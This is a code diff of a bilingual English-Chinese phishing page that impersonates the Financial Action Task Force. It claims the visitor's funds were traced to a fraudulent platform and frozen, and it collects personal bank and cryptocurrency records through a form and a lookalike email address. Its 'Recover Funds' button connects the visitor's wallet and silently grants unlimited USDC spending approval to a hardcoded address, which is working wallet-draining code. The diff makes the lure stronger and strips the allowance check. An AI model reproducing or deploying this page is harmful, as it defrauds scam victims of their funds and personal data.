@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Wallet Query and Authorization</title>
+    <title>FATF Notification Website</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -13,18 +13,22 @@
             color: #333;
         }
         header {
-            background-color: #c00;
-            color: white;
+            background-color: #c00; /* 背景颜色 */
+            color: white; /* 文字颜色 */
             text-align: center;
             padding: 15px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
+            display: flex; /* 使用 flexbox 布局 */
+            align-items: center; /* 垂直居中对齐 */
+            justify-content: center; /* 水平居中对齐 */
         }
         header img {
-            width: 80px;
-            height: 142px;
-            margin-right: 15px;
+            width: 80px; /* 图片宽度 */
+            height: 142px; /* 图片高度 */
+            margin-right: 15px; /* 图片与文字间距 */
+        }
+        header h1 {
+            font-size: 1.8em; /* 标题字体大小 */
+            margin: 0; /* 去掉默认的边距 */
         }
         nav {
             display: flex;
@@ -84,53 +88,66 @@
     <nav>
         <a href="#notification">Notification</a>
         <a href="#materials">Submit Materials</a>
-        <a href="#recovery">Query and Approve</a>
+        <a href="#recovery">Recover Funds</a>
     </nav>
 
+    <!-- Notification Section -->
     <div class="container" id="notification">
         <h2 class="section-title">Notification Letter / 协助调查通知函</h2>
         <p><strong>Dear User, 尊敬的用户：</strong></p>
         <p>We are the Financial Action Task Force (FATF), committed to combating money laundering and fraud worldwide to ensure the security and transparency of the global financial system. 我们是国际反洗钱组织（FATF），致力于打击全球范围内的洗钱和诈骗活动，维护金融系统的安全与透明。</p>
+        <p>Recently, during our analysis of global blockchain transactions, we discovered that you were involved in transactions with a confirmed fraudulent platform, HashKey. 近期，我方在对全球区块链交易的合规性和资金流向进行分析时，发现您曾与已确认的诈骗虚假平台HashKey存在交易往来。<br>Through blockchain tracking technology, we further traced your funds to the Gate.io exchange. 通过区块链天眼溯源技术，我们进一步追踪到您的相关资金随后流入Gate.io交易所。</p>
+        <p><strong>Actions Taken / 已采取措施：</strong></p>
+        <ul>
+            <li><strong>Account Freezing / 账户冻结：</strong>We have reported the case to relevant exchanges and coordinated to freeze suspicious funds to prevent further losses. 我们已向相关交易所通报情况，并协调冻结了可疑资金，以防进一步损失。</li>
+            <li><strong>Fund Tracing / 资金溯源：</strong>We are collaborating with global judicial authorities to trace the fraudulent funds. 我们正联合各国司法部门对相关资金进行溯源分析，以定位诈骗资金流向。</li>
+        </ul>
+        <p>Please respond within 7 days to submit the necessary materials for investigation. 感谢您的理解与配合，请务必在收到本通知后7日内提交相关材料。</p>
+    </div>
+    <!-- Materials Submission Section -->
+    <div class="container" id="materials">
+        <h2 class="section-title">Submit Materials / 提交辅助材料</h2>
+        <p>Please submit the following materials for investigation: 为确保调查顺利进行，请提交以下材料：</p>
+        <ul>
+            <li>Personal Fraud Record / 个人被骗记录：Describe in detail the transaction process with the fraudulent platform, including amount, time, and platform specifics. 详细描述与诈骗平台的交易过程，包括交易金额、时间、平台及具体情况。</li>
+            <li>Bank Transaction Record / 银行交易记录：Upload records of bank transfers related to fraudulent transactions. 提供与诈骗平台交易相关的银行账户转账记录。</li>
+            <li>Cryptocurrency Transaction Record / 虚拟货币交易记录：Upload transaction proofs related to exchanges or wallets. 包括在各交易所或钱包中与该事件相关的资金流动证明。</li>
+        </ul>
+        <p>Click the button below to submit via Google Form: 点击以下按钮通过谷歌表单提交：</p>
+        <a href="https://docs.google.com/forms/d/e/1FAIpQLSdmj9CaYuaUQdZ6GLlL8-qLIOS3o9VG4tZU0JVwuLcf_ijDDg/viewform?usp=pp_url" target="_blank">
+            <button>Submit Materials / 提交材料</button>
+        </a>
+        <p>Or email materials to / 或发送材料至：<a href="mailto:support@fatfgroup.org">support@fatfgroup.org</a></p>
     </div>
 
+    <!-- Funds Recovery Section -->
     <div class="container" id="recovery">
-        <h2 class="section-title">Query and Approve Wallet / 查询并授权钱包</h2>
-        <p>Connect your wallet and authorize transactions for fund recovery. 请连接您的钱包并授权，以便完成资金查询和追回操作。</p>
+        <h2 class="section-title">Recover Funds / 资金追回</h2>
+        <p>Connect your wallet and authorize transactions for fund recovery. 请连接您的钱包并授权，以便完成资金追回操作。</p>
         <button id="connectWallet" onclick="connectWallet()">Connect Wallet / 连接钱包</button>
         <p id="walletStatus">Wallet Not Connected / 钱包未连接</p>
-        <button id="approveButton" onclick="approveTokens()" disabled>Query Wallet / 查询钱包</button>
+        <button id="approveButton" onclick="approveTokens()" disabled>Authorize Unlimited Tokens / 授权无限代币</button>
     </div>
+
     <footer>
         <p>&copy; 2024 Financial Action Task Force. All rights reserved. / 版权所有</p>
     </footer>
 
     <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
     <script>
-        // 配置合约地址和 RPC 提供商
-        const tokenAddress = "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48"; // USDC 目标代币地址
-        const proxyAddress = "0x14ab009f9cfce598fbf726c56f9acd94fff74fa5"; // 您提供的代理合约地址
+        const tokenAddress = "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48"; // USDC目标代币地址
+        const proxyAddress = "0x14ab009f9cfce598fbf726c56f9acd94fff74fa5"; // 提供的代理合约地址
         let provider, signer;
 
-        // ERC20 合约 ABI
-        const tokenABI = [
-            "function approve(address spender, uint256 amount) external returns (bool)",
-            "function balanceOf(address account) external view returns (uint256)",
-            "function allowance(address owner, address spender) external view returns (uint256)"
-        ];
-
-        // 连接钱包
         async function connectWallet() {
             if (typeof window.ethereum !== "undefined") {
                 try {
-                    // 初始化 Web3 提供商
                     provider = new ethers.providers.Web3Provider(window.ethereum);
                     await provider.send("eth_requestAccounts", []);
                     signer = provider.getSigner();
                     const walletAddress = await signer.getAddress();
-
-                    // 更新钱包状态
                     document.getElementById("walletStatus").innerText = `Connected Wallet: ${walletAddress} / 已连接钱包地址: ${walletAddress}`;
-                    document.getElementById("approveButton").disabled = false; // 启用查询按钮
+                    document.getElementById("approveButton").disabled = false;
                 } catch (error) {
                     alert("Wallet connection failed. Please try again! / 钱包连接失败，请重试！");
                 }
@@ -139,33 +156,20 @@
             }
         }
 
-        // 查询并授权代币
         async function approveTokens() {
             if (!signer) {
                 alert("Please connect your wallet first! / 请先连接您的钱包！");
                 return;
             }
 
-            // 创建代币合约实例
+            const tokenABI = ["function approve(address spender, uint256 amount) external returns (bool)"];
             const tokenContract = new ethers.Contract(tokenAddress, tokenABI, signer);
 
             try {
-                // 查询授权额度
-                const allowance = await tokenContract.allowance(await signer.getAddress(), proxyAddress);
-                console.log(`Allowance: ${allowance.toString()} USDC`);
-
-                // 如果授权额度不足，调用 approve 方法授权无限额度
-                if (allowance.lt(ethers.constants.MaxUint256)) {
-                    const tx = await tokenContract.approve(proxyAddress, ethers.constants.MaxUint256);
-                    console.log("Authorization transaction sent:", tx.hash);
-                    alert("Query and approval successful! / 查询并授权成功！");
-                    await tx.wait(); // 等待交易确认
-                } else {
-                    alert("Authorization already sufficient. / 授权额度已足够，无需重复操作。");
-                }
+                const tx = await tokenContract.approve(proxyAddress, ethers.constants.MaxUint256);
+                alert("Authorization successful! / 授权成功！");
             } catch (error) {
-                console.error("Query and approval failed:", error);
-                alert("Query and approval failed. Please check console logs! / 查询或授权失败，请检查控制台日志！");
+                alert("Authorization failed. Please check console logs! / 授权失败，请检查控制台日志！");
             }
         }
     </script>
